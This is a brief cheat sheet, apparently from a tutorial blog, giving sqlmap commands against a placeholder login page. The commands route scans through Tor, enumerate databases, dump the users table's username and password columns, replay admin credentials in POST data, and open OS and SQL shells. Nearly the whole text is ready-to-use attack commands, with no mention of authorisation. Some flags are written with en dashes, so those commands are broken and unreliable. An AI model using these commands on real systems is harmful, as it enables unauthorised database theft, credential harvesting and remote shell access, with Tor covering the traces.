Cheat Sheet
Easy Scanning option

```shell
sqlmap -u "http://testsite.com/login.php"
```
Scanning by using tor

```shell
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5
```
Scanning by manually setting the return time

```shell
sqlmap -u "http://testsite.com/login.php" --time-sec 15
```
List all databases at the site

```shell
sqlmap -u "http://testsite.com/login.php" --dbs
```
List all tables in a specific database

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
```
Dump the contents of a DB table

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
```
List all columns in a table

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
```
Dump only selected columns

```shell
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
```
Dump a table from a database when you have admin credentials

```shell
sqlmap -u "http://testsite.com/login.php" –method "POST" –data "username=admin&password=admin&submit=Submit" -D social_mccodes -T users –dump
```
Get OS Shell
```shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell
```
Get SQL Shell
```shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
```
The ultimate manual for sqlmap can also be found here

Conclusion
As always I hope you found this tutorial useful Please let em know if you want to see a comprehensive sqlmap tutorial.